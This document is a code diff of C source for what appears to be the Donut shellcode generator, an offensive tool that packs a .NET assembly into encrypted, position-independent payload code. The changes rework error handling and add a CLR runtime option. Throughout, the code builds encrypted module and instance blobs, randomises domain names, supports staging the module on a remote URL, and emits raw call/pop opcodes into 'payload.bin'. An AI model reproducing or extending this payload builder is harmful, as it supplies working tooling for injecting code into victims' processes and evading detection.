@@ -80,7 +80,7 @@ static GUID xIID_AppDomain = {
   
 // returns 1 on success else <=0
 // this doesn't have to be secure.
-EXPORT_FUNC int CreateRandom(void *buf, size_t len) {
+static int CreateRandom(void *buf, size_t len) {
     
 #if defined(WINDOWS)
     HCRYPTPROV prov;
@@ -98,7 +98,7 @@ EXPORT_FUNC int CreateRandom(void *buf, size_t len) {
     return ok;
 #else
     int      fd;
-    size_t   r;
+    size_t   r=0;
     uint8_t *p=(uint8_t*)buf;
     
     DPRINT("Opening /dev/urandom to acquire %li bytes", len);
@@ -136,37 +136,32 @@ static int GenRandomString(void *output, size_t len) {
     return 1;
 }
 
-// create a donut module for configuration
-// returns 1 for okay, else 0
-EXPORT_FUNC int CreateModule(PDONUT_CONFIG c) {
+static int CreateModule(PDONUT_CONFIG c) {
     struct stat   fs;
     FILE          *fd;
     PDONUT_MODULE mod = NULL;
-    size_t        len;
+    size_t        len = 0;
     char          *param;
-    int           cnt;
+    int           cnt, err=DONUT_ERROR_SUCCESS;
     
-    // no parameter? exit
+    // no config? exit
     DPRINT("Checking configuration");
-    if(c == NULL) return 0;
-    
-    // no file? exit
-    DPRINT("Checking .NET assembly");
-    if(c->file == NULL) return 0;
-
+    if(c == NULL || c->file == NULL) {
+      return DONUT_ERROR_INVALID_PARAMETER;
+    }
     // inaccessibe? exit
     DPRINT("stat(%s)", c->file);
-    if(stat(c->file, &fs) != 0) return 0;
+    if(stat(c->file, &fs) != 0) return DONUT_ERROR_ASSEMBLY_NOT_FOUND;
 
     // zero file size? exit
-    if(fs.st_size == 0) return 0;
+    if(fs.st_size == 0) return DONUT_ERROR_ASSEMBLY_EMPTY;
 
     // try open assembly
     DPRINT("Opening %s...", c->file);
     fd = fopen(c->file, "rb");
 
     // not opened? return
-    if(fd == NULL) return 0;
+    if(fd == NULL) return DONUT_ERROR_ASSEMBLY_ACCESS;
 
     // allocate memory for module information and assembly
     len = sizeof(DONUT_MODULE) + fs.st_size;
@@ -179,7 +174,9 @@ EXPORT_FUNC int CreateModule(PDONUT_CONFIG c) {
       
       // if no domain name specified, generate a random string for it
       if(c->domain[0] == 0) {
-        if(!GenRandomString(c->domain, 8)) return 0;
+        if(!GenRandomString(c->domain, 8)) {
+          return DONUT_ERROR_RANDOM;
+        }
       }
     
       DPRINT("Domain  : %s", c->domain);
@@ -191,8 +188,10 @@ EXPORT_FUNC int CreateModule(PDONUT_CONFIG c) {
       DPRINT("Method  : %s", c->method);
       mbstowcs((wchar_t*)mod->method,  c->method, strlen(c->method));
       
-      DPRINT("Runtime : %s", DONUT_RUNTIME_NET4);
-      mbstowcs((wchar_t*)mod->runtime, DONUT_RUNTIME_NET4, strlen(DONUT_RUNTIME_NET4));
+      if(c->runtime[0] == 0) strcpy(c->runtime, DONUT_RUNTIME_NET4);
+      
+      DPRINT("Runtime : %s", c->runtime);
+      mbstowcs((wchar_t*)mod->runtime, c->runtime, strlen(c->runtime));
 
       // if parameters specified
       if(c->param != NULL) {
@@ -213,21 +212,18 @@ EXPORT_FUNC int CreateModule(PDONUT_CONFIG c) {
       mod->len = fs.st_size;
       // read assembly into memory
       fread(&mod->data, 1, fs.st_size, fd);
-    }
+    } else err = DONUT_ERROR_NO_MEMORY;
     // close assembly
     fclose(fd);
-    // memory allocation failed? return
-    if(mod == NULL) return 0;
+
     // update configuration with pointer to module
     c->mod     = mod;
     c->mod_len = len;
     
-    return 1;
+    return err;
 }
 
-// create a donut instance for configuration
-// returns 1 for okay, else 0
-EXPORT_FUNC int CreateInstance(PDONUT_CONFIG c) {
+static int CreateInstance(PDONUT_CONFIG c) {
     DONUT_CRYPT     inst_key, mod_key;
     PDONUT_INSTANCE inst = NULL;
     size_t          url_len, inst_len = 0;
@@ -258,11 +254,11 @@ EXPORT_FUNC int CreateInstance(PDONUT_CONFIG c) {
       return DONUT_ERROR_RANDOM;
     }
 #if !defined(NOCRYPTO)
-    DPRINT("Generating random key for encrypting instance");
+    DPRINT("Generating random key for donut_encrypting instance");
     if(!CreateRandom(&inst_key, sizeof(DONUT_CRYPT))) {
       return DONUT_ERROR_RANDOM;
     }
-    DPRINT("Generating random key for encrypting module");
+    DPRINT("Generating random key for donut_encrypting module");
     if(!CreateRandom(&mod_key, sizeof(DONUT_CRYPT))) {
       return DONUT_ERROR_RANDOM;
     }
@@ -349,6 +345,7 @@ EXPORT_FUNC int CreateInstance(PDONUT_CONFIG c) {
       
       strcpy(inst->http.url, c->url);
       if(slash) strcat(inst->http.url, "/");
+      if(slash) strcat(c->url, "/");
       // append module name
       strcat(inst->http.url, c->modname);
       // set the request verb
@@ -367,11 +364,11 @@ EXPORT_FUNC int CreateInstance(PDONUT_CONFIG c) {
     
 #if !defined(NOCRYPTO)
     if(c->type == DONUT_INSTANCE_URL) {
-      DPRINT("Encrypting module for download");
+      DPRINT("donut_encrypting module for download");
       
       c->mod->mac = maru(inst->sig, inst->iv);
       
-      encrypt(
+      donut_encrypt(
         mod_key.mk, 
         mod_key.ctr, 
         c->mod, 
@@ -385,28 +382,28 @@ EXPORT_FUNC int CreateInstance(PDONUT_CONFIG c) {
     }
     
 #if !defined(NOCRYPTO)
-    DPRINT("Encrypting instance");
+    DPRINT("donut_encrypting instance");
     
     inst->mac = maru(inst->sig, inst->iv);
     
     uint32_t ofs = sizeof(uint32_t) + sizeof(DONUT_CRYPT);
     uint8_t *inst_data = (uint8_t*)inst + ofs;
     
-    encrypt(
+    donut_encrypt(
       inst_key.mk, 
       inst_key.ctr, 
       inst_data, 
       c->inst_len - ofs);
 #endif
-    return 1;
+    return DONUT_ERROR_SUCCESS;
 }
   
 // given a configuration, create a PIC that will run from anywhere in memory
 EXPORT_FUNC int CreatePayload(PDONUT_CONFIG c) {
     uint8_t *pl, *pld;
-    size_t plen;
-    int err = DONUT_ERROR_SUCCESS;
-    FILE *fd;
+    size_t  plen;
+    int     err = DONUT_ERROR_SUCCESS;
+    FILE    *fd;
     
     switch(c->arch) {
       case DONUT_ARCH_X86 :
@@ -421,10 +418,14 @@ EXPORT_FUNC int CreatePayload(PDONUT_CONFIG c) {
         return DONUT_ERROR_INVALID_ARCH;
     }
     
-    if(CreateModule(c)) {
-      // 1. create the instance
+    // 1. create the module
+    DPRINT("Creating module");
+    err = CreateModule(c);
+    if(err == DONUT_ERROR_SUCCESS) {
+      // 2. create the instance
       DPRINT("Creating instance");
-      if(CreateInstance(c)) {
+      err = CreateInstance(c);
+      if(err == DONUT_ERROR_SUCCESS) {
         // if DEBUG is defined, save instance to disk
         #ifdef DEBUG
           DPRINT("Saving instance to file");
@@ -435,10 +436,10 @@ EXPORT_FUNC int CreatePayload(PDONUT_CONFIG c) {
             fclose(fd);
           }
         #endif
-        // 2. if this module will be stored on a remote server
+        // 3. if this module will be stored on a remote server
         if(c->type == DONUT_INSTANCE_URL) {
           DPRINT("Saving %s to disk.", c->modname);
-          // save module to disk
+          // save the module to disk using random name
           fd = fopen(c->modname, "wb");
           
           if(fd != NULL) {
@@ -446,7 +447,7 @@ EXPORT_FUNC int CreatePayload(PDONUT_CONFIG c) {
             fclose(fd);
           }
         }
-        // 3. calculate size of PIC + instance combined
+        // 4. calculate size of PIC + instance combined
         // allow additional space for some x86/amd64 opcodes
         c->pic_len = plen + c->inst_len + 8;
         c->pic     = malloc(c->pic_len);
@@ -456,30 +457,33 @@ EXPORT_FUNC int CreatePayload(PDONUT_CONFIG c) {
           // for now, only x86 and amd64 are supported.
           // since the payload is written in C, 
           // adding support for ARM64 shouldn't be difficult
-          if(pl != NULL) {
-            *pl++ = 0xE8;                       // insert call opcode
-            ((uint32_t*)pl)[0] = c->inst_len;   // insert offset to executable code
-            pl += sizeof(uint32_t);             // skip 4 bytes used for offset
-            // copy the instance (plus the module if attached)
-            memcpy(pl, c->inst, c->inst_len);  
-            pl += c->inst_len;                  // skip instance
-            // we use fastcall convention for 32-bit code.
-            // microsoft fastcall is used by default for 64-bit code.
-            // the pointer to instance is placed in ecx/rcx
-            *pl++ = 0x59;                       // insert pop ecx / pop rcx
-            // copy the assembly code
-            memcpy(pl, pld, plen);
-          }
+          *pl++ = 0xE8;                       // insert call opcode
+          ((uint32_t*)pl)[0] = c->inst_len;   // insert offset to executable code
+          pl += sizeof(uint32_t);             // skip 4 bytes used for offset
+          // copy the instance (plus the module if attached)
+          memcpy(pl, c->inst, c->inst_len);  
+          pl += c->inst_len;                  // skip instance
+          // we use fastcall convention for 32-bit code.
+          // microsoft fastcall is used by default for 64-bit code.
+          // the pointer to instance is placed in ecx/rcx
+          *pl++ = 0x59;                       // insert pop ecx / pop rcx
+          // copy the assembly code
+          memcpy(pl, pld, plen);
+          err = DONUT_ERROR_SUCCESS;
         } else err = DONUT_ERROR_NO_MEMORY;
       }
+    }
+    if(err != DONUT_ERROR_SUCCESS) {
+      FreePayload(c);
     }
     return err;
 }
 
-EXPORT_FUNC int ReleasePayload(PDONUT_CONFIG c) {
+EXPORT_FUNC int FreePayload(PDONUT_CONFIG c) {
     
-    if(c == NULL) return 0;
-    
+    if(c == NULL) {
+      return DONUT_ERROR_INVALID_PARAMETER;
+    }
     // free module
     if(c->mod != NULL) {
       free(c->mod);
@@ -495,7 +499,7 @@ EXPORT_FUNC int ReleasePayload(PDONUT_CONFIG c) {
       free(c->pic);
       c->pic = NULL;
     }
-    return 1;
+    return DONUT_ERROR_SUCCESS;
 }
 
 // define when building an executable
@@ -525,6 +529,7 @@ static void usage (void) {
     printf("       -p <arg1,arg2...>    Optional parameters for method, separated by comma or semi-colon.\n");
     
     printf("       -a <arch>            Target architecture : 1=x86, 2=amd64(default).\n");
+    printf("       -r <version>         CLR runtime version. v4.0.30319 is used by default.\n");
     printf("       -d <name>            Domain name to create for assembly. Randomly generated by default.\n\n");
 
     printf(" examples:\n\n");
@@ -537,7 +542,7 @@ static void usage (void) {
 int main(int argc, char *argv[]) {
     DONUT_CONFIG c;
     char         opt;
-    int          i;
+    int          i, err;
     FILE         *fd;
     char         *arch_str[2] = { "x86", "AMD64" };
     char         *inst_type[2]= { "PIC", "URL"   };
@@ -568,15 +573,19 @@ int main(int argc, char *argv[]) {
           break;
         // name of domain to use
         case 'd':
-          strncpy(c.domain, get_param(argc, argv, &i), DONUT_MAX_NAME);
+          strncpy(c.domain, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
           break;
         // assembly to use
         case 'f':
           c.file   = get_param(argc, argv, &i);
           break;
+        // runtime version to use
+        case 'r':
+          strncpy(c.runtime, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
+          break;
         // url of remote assembly
         case 'u': {
-          c.url    = get_param(argc, argv, &i);
+          strncpy(c.url, get_param(argc, argv, &i), DONUT_MAX_URL - 2);
           c.type   = DONUT_INSTANCE_URL;
           break;
         }
@@ -621,29 +630,35 @@ int main(int argc, char *argv[]) {
     printf("  [ .NET Assembly : %s\n", c.file  );
     printf("  [ Class         : %s\n", c.cls   );
     printf("  [ Method        : %s\n", c.method);
+    if(c.param != NULL) {
+      printf("  [ Parameters    : %s\n", c.param);
+    }
     printf("  [ Target CPU    : %s\n", arch_str[c.arch]);
 
-    printf("\n  [ Creating payload...");
+    printf("\n  [ Creating payload...\n");
     
-    if(CreatePayload(&c) == DONUT_ERROR_SUCCESS) {
-      printf("ok.\n");
-      
-      if(c.type == DONUT_INSTANCE_URL) {
-        printf("  [ Module name   : %s\n", c.modname);
-        printf("  [ Upload to     : %s\n", c.url);
-      }
-      printf("  [ Saving to disk...");
-      fd=fopen("payload.bin", "wb");
-      
-      if(fd!=NULL) {
-        fwrite(c.pic, 1, c.pic_len, fd);
-        fclose(fd);
-        printf("ok.\n");
-      } else {
-        printf("failed.\n");
-      }
-      ReleasePayload(&c);
+    err = CreatePayload(&c);
+    
+    if(err != DONUT_ERROR_SUCCESS) {
+      printf("  [ Error : %i\n", err);
+      return 0;
     }
+      
+    if(c.type == DONUT_INSTANCE_URL) {
+      printf("  [ Module name   : %s\n", c.modname);
+      printf("  [ Upload to     : %s\n", c.url);
+    }
+    
+    printf("  [ Saving code to \"payload.bin\"\n");
+    fd = fopen("payload.bin", "wb");
+    
+    if(fd != NULL) {
+      fwrite(c.pic, 1, c.pic_len, fd);
+      fclose(fd);
+    } else {
+      printf("  [ Error accessing file.\n");
+    }
+    FreePayload(&c);
     return 0;
 }
 #endif
